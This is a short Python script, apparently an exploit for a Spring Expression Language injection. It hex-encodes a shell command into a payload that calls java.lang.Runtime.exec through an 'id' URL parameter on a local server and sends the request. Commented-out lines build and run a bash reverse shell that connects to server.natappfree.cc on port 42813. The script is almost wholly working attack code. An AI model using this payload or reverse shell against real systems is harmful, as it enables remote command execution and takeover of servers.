import requests
# coding: utf-8
#echo '#!/bin/bash' > reverseshell.sh
#echo '/bin/bash -i >& /dev/tcp/server.natappfree.cc/42813 0>&1' >> reverseshell.sh
#chmod 777 ./reverseshell.sh
#./reverseshell.sh

result = ""
target = "mkdir 123"
#/bin/bash
for x in target:
    result += hex(ord(x)) + ","

print(result.rstrip(','))
url="http://127.0.0.1:8080/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{"+result.rstrip(',')+"}))}"
print(url)
response=requests.get(url)
if response.status_code == 200:
    print("命令执行成功")
else:
    print("命令执行失败")
print(response)